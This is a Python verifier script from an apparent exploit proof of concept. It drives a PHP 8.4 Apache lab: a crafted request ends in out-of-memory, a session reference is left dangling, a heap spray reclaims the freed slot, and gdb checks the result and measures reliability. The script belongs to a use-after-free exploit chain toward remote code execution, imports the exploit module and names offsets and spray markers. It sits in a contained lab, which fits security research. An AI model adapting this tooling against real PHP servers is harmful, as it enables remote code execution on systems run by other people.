#!/usr/bin/env python3
"""Driver/verifier for the pre-RINIT RSHUTDOWN-skip dangle (rshutdown_dangle.py).

Runs against the single-immortal-worker php:8.4.26-apache lab from
docker-compose.reuse.yml --profile rshutdown (host port 8098). Three phases:

  (0) OOM check        -- fire request A, confirm it 500s fast (OOM in
                          php_hash_environment, pre module-RINIT) and the worker
                          survives.
  (1) gdb mechanism    -- attach gdb to the worker and prove, from php-src symbols:
                            a. A's session RSHUTDOWN is SKIPPED (modules_activated
                               stayed 0) -> PS(http_session_vars) left dangling;
                            b. the dangle is still IS_REFERENCE (0x10a) at request
                               B's php_request_startup (carried across A->B);
                            c. B's plain spray RECLAIMS the freed 32B reference slot
                               (the freed-slot bytes become the spray value), with
                               NO refcount-forge and NO live carrier.
  (2) reliability      -- repeat A->B N times under gdb, count how often the
                          dangle is present AND the plain reclaim lands.

gdb runs INSIDE the container (needs cap_add SYS_PTRACE + seccomp:unconfined,
provided by docker-compose.reuse.yml --profile rshutdown). The HTTP driver runs
on the HOST (the lab image has no python3). Pure stdlib; safe under `python3 -I`.

Usage:
    python3 -I verify_rshutdown_dangle.py                 # full run
    python3 -I verify_rshutdown_dangle.py --trials 30
    python3 -I verify_rshutdown_dangle.py --no-gdb        # phase 0 only
"""
from __future__ import annotations

import argparse
import os
import re
import secrets
import socket
import subprocess
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import rshutdown_dangle as rd

HSV_VAL_OFF = 0x168   # ps_globals.http_session_vars.value   (gdb/disasm derived)
HSV_TYPE_OFF = 0x170  # ps_globals.http_session_vars.u1.type_info
IS_REFERENCE_TI = 0x10a


# docker / gdb plumbing
def docker(container: str, *cmd: str, timeout: float = 60.0) -> str:
    try:
        r = subprocess.run(["docker", "exec", container, *cmd],
                           capture_output=True, timeout=timeout)
        return r.stdout.decode("utf-8", "replace") + r.stderr.decode("utf-8", "replace")
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
        return "[docker exec error: %r]" % e


def worker_pid(container: str) -> str:
    out = docker(container, "bash", "-c",
                 "ps -eo pid,user,comm | awk '/www-data/ && /apache2/ {print $1; exit}'")
    m = re.search(r"\d+", out)
    return m.group(0) if m else ""


def ensure_gdb(container: str) -> bool:
    if "gdb" in docker(container, "bash", "-c", "command -v gdb || true"):
        return True
    docker(container, "bash", "-c",
           "apt-get update -qq >/dev/null 2>&1 && apt-get install -y -qq gdb >/dev/null 2>&1",
           timeout=300)
    return "gdb" in docker(container, "bash", "-c", "command -v gdb || true")


def kill_gdb(container: str) -> None:
    docker(container, "bash", "-c", "pkill -9 gdb 2>/dev/null || true")


def start_gdb(container: str, pid: str, gdb_script: str, outfile: str) -> None:
    # write script into the container, launch gdb detached, logging to outfile
    b64 = __import__("base64").b64encode(gdb_script.encode()).decode()
    docker(container, "bash", "-c",
           "echo %s | base64 -d > /tmp/_rsd.gdb" % b64)
    docker(container, "bash", "-c",
           "setsid gdb -q -batch -x /tmp/_rsd.gdb -p %s > %s 2>&1 < /dev/null &" % (pid, outfile))


def read_gdb(container: str, outfile: str) -> str:
    return docker(container, "cat", outfile)


# gdb script: log request boundaries, the dangling-REF dtor (+ reclaimed payload),
# and every session-RSHUTDOWN. The track_init breakpoint is conditional on the
# slot already being a REFERENCE, so the payload deref is always valid.
GDB_SCRIPT = r"""
set pagination off
set width 0
set height 0
set $HSVT = (char*)&ps_globals+{tyoff}
set $HSVV = (char*)&ps_globals+{vaoff}
break php_request_startup
commands
  silent
  printf "REQ_START hsv_type=0x%x\n", *(unsigned int*)$HSVT
  continue
end
break php_session_track_init if *(unsigned int*)((char*)&ps_globals+{tyoff})==0x10a
commands
  silent
  set $r = *(unsigned long*)$HSVV
  printf "DANGLE_DTOR ref=0x%lx gc_type=0x%x refcount=0x%x payload24=0x%lx\n", $r, *(unsigned int*)($r+4), *(unsigned int*)($r), *(unsigned long*)($r+24)
  continue
end
break php_rshutdown_session_globals
commands
  silent
  printf "RSHUTDOWN_SESSION hsv_type=0x%x\n", *(unsigned int*)$HSVT
  continue
end
catch signal SIGSEGV
commands
  printf "SIGSEGV pc=%p\n", $pc
  bt 10
  detach
  quit
end
continue
""".replace("{tyoff}", hex(HSV_TYPE_OFF)).replace("{vaoff}", hex(HSV_VAL_OFF))


# HTTP helpers
def new_sid(tag: bytes) -> bytes:
    return (b"i097" + tag + secrets.token_hex(14).encode())[:32]


def http_alive(host: str, port: int, path: str, timeout: float = 5.0) -> bytes:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n"
                   % (path, host)).encode())
        r = s.recv(80)
        s.close()
        return r.split(b"\r\n", 1)[0]
    except OSError as e:
        return b"[alive %r]" % e


# phases
def phase0_oom(host: str, port: int, path: str) -> bool:
    print("\n== phase 0: request A OOM (pre-RINIT) ==")
    sid = new_sid(b"A")
    t0 = time.time()
    resp = rd.send_chunked(host, port, path, rd.build_request_a(sid))
    dt = time.time() - t0
    sl = rd.status_line(resp)
    alive = http_alive(host, port, path)
    ok = b"500" in sl and dt < 3.0 and b"200" in alive
    print("   A status=%r  t=%.3fs  worker_alive_after=%r" % (sl, dt, alive))
    print("   -> %s: A 500s fast (OOM in php_hash_environment, before the script"
          " runs) and the immortal worker survives." % ("PASS" if ok else "FAIL"))
    return ok


def _fire_cycle(host: str, port: int, path: str, tag: bytes) -> None:
    sid = new_sid(tag)
    rd.send_chunked(host, port, path, rd.build_request_a(sid))
    time.sleep(0.4)
    rd.send_plain(host, port, path, rd.build_request_b_reclaim(sid))
    time.sleep(0.4)


def phase1_gdb(container: str, host: str, port: int, path: str,
               compose: str) -> None:
    print("\n== phase 1: gdb mechanism proof ==")
    if not ensure_gdb(container):
        print("   SKIP: gdb unavailable in container"); return
    kill_gdb(container)
    _restart(compose, host, port, path)
    pid = worker_pid(container)
    print("   worker pid=%s; attaching gdb (symbols from unstripped libphp.so)" % pid)
    start_gdb(container, pid, GDB_SCRIPT, "/tmp/_rsd.out")
    time.sleep(3)
    _fire_cycle(host, port, path, b"P")
    time.sleep(2)
    log = read_gdb(container, "/tmp/_rsd.out")
    kill_gdb(container)

    lines = [l for l in log.splitlines()
             if any(k in l for k in ("REQ_START", "DANGLE_DTOR", "RSHUTDOWN_SESSION", "SIGSEGV"))]
    print("   --- gdb trace ---")
    for l in lines:
        print("     " + l)
    # pass/fail checks
    b_start = [l for l in lines if "REQ_START" in l]
    dangle_at_b = any("hsv_type=0x10a" in l for l in b_start)
    dtor = [l for l in lines if "DANGLE_DTOR" in l]
    reclaimed = any("payload24=0x4b4b4b4b4b4b4b" in l for l in dtor)  # "KKKKKKK"
    print("   --- verdict ---")
    print("   a. dangle present at B's request_start (hsv IS_REFERENCE 0x10a): %s"
          % ("YES" if dangle_at_b else "NO"))
    print("   b. A's session RSHUTDOWN skipped (slot carried A->B uncleaned)   : %s"
          % ("YES" if dangle_at_b else "NO"))
    print("   c. freed 32B reference slot reclaimed by PLAIN spray             : %s"
          % ("YES (payload=KKKKKKK)" if reclaimed else "NO"))
    if dtor and not reclaimed:
        print("      (dtor saw gc_type on the reclaimed slot; see trace for bytes)")


def phase2_reliability(container: str, host: str, port: int, path: str,
                       compose: str, trials: int) -> None:
    print("\n== phase 2: reliability over %d A->B trials ==" % trials)
    if not ensure_gdb(container):
        print("   SKIP: gdb unavailable"); return
    kill_gdb(container)
    _restart(compose, host, port, path)
    pid = worker_pid(container)
    start_gdb(container, pid, GDB_SCRIPT, "/tmp/_rsd.out")
    time.sleep(3)
    for i in range(trials):
        _fire_cycle(host, port, path, b"R")
    time.sleep(2)
    log = read_gdb(container, "/tmp/_rsd.out")
    kill_gdb(container)

    # each B contributes one REQ_START with hsv_type, and (if dangling) one DANGLE_DTOR
    starts = re.findall(r"REQ_START hsv_type=0x([0-9a-f]+)", log)
    # B requests are the ones where hsv was already a REFERENCE at start
    dangles = sum(1 for t in starts if t == "10a")
    reclaims = len(re.findall(r"DANGLE_DTOR .*payload24=0x4b4b4b4b4b4b4b", log))
    print("   trials=%d  dangle_present=%d  plain_reclaim_landed=%d" % (trials, dangles, reclaims))
    if trials:
        print("   dangle reliability     : %.0f%%" % (100.0 * dangles / trials))
        print("   plain-reclaim landing  : %.0f%%" % (100.0 * reclaims / trials))
    print("   (compare: our live-carrier END-to-END RCE path ~8% on WSL2.)")
    print("   NOTE: these measure the dangle+reclaim PRIMITIVE, not end-to-end RCE")
    print("         (RCE still needs the chunk leak + groom -- see rshutdown_dangle docstring).")


def _restart(compose: str, host: str, port: int, path: str) -> None:
    subprocess.run(["docker", "compose", "-f", compose, "-p", "p2s-rshutdown",
                    "--profile", "rshutdown", "restart"],
                   capture_output=True, timeout=120)
    for _ in range(12):
        if b"200" in http_alive(host, port, path):
            break
        time.sleep(1)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8098)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--container", default="php2shell_rshutdown-rsd-apache-1")
    ap.add_argument("--compose", default="docker-compose.reuse.yml")
    ap.add_argument("--trials", type=int, default=20)
    ap.add_argument("--no-gdb", action="store_true")
    args = ap.parse_args()

    print("target: http://%s:%d%s  container=%s" % (args.host, args.port, args.path, args.container))
    if b"200" not in http_alive(args.host, args.port, args.path):
        print("[-] lab not reachable; bring it up: docker compose -f %s "
              "-p p2s-rshutdown --profile rshutdown up -d" % args.compose)
        return 2

    phase0_oom(args.host, args.port, args.path)
    if not args.no_gdb:
        phase1_gdb(args.container, args.host, args.port, args.path, args.compose)
        phase2_reliability(args.container, args.host, args.port, args.path,
                           args.compose, args.trials)
    return 0


if __name__ == "__main__":
    sys.exit(main())
